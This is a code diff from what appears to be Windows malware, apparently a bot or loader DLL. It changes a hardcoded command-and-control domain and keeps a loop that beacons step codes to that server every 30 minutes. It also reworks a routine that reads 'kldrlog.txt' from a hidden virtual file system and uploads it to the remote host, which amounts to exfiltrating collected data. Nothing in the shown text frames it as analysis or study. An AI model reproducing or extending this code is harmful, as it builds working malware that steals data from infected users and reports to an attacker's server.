@@ -10,7 +10,7 @@ char URL[1024], URL2[1024];
 
 //typedef HRESULT (WINAPI *typeURLDownloadToFileA)( LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB );
 
-const char* HOST = "dgbsdfs.info";
+const char* HOST = "srgsgsg.info";
 #ifdef RELEASEDLL
 	char* UrlStep = "geter/index_.php?cmd=step&uid=%s&step=%d%%5Fdp";
 #else
@@ -100,7 +100,7 @@ DWORD WINAPI PingerProc(LPVOID)
 {
 	while( true )
 	{
-		SendCmdStep(164);
+		SendCmdStep(165);
 		Sleep(1000 * 60 * 30);
 	}
 /*
@@ -154,13 +154,18 @@ BOOL APIENTRY MyMain( HMODULE hModule,
 		if( FsPresent )
 		{
 			SendCmdStep(162);
-			char* data;
-			int c_data;
-			CmdCopy( "kldrlog.txt", &data, c_data );
-			WriteAllBytes( "c:\\kldrlog.txt", data, c_data );
-			wsprintfA( URL, UrlCmdStorefile2, UID );
-			UploadFile( HOST, URL, "rep", "log.txt", data, c_data, "HDPHDMMOHSGN" );
-			SendCmdStep(163);
+			char* data = 0;
+			int c_data = 0;
+			char fileSrc[128];
+			if( CmdCopy( "vfs\\kldrlog.txt", &data, c_data ) == NO_ERROR )
+			{
+				//WriteAllBytes( "c:\\kldrlog.txt", data, c_data );
+				wsprintfA( URL, UrlCmdStorefile2, UID );
+				UploadFile( HOST, URL, "rep", "log.txt", data, c_data, "HDPHDMMOHSGN" );
+				SendCmdStep(163);
+			}
+			else
+				SendCmdStep(164);
 		}
 		return PingerProc(NULL);
 	}
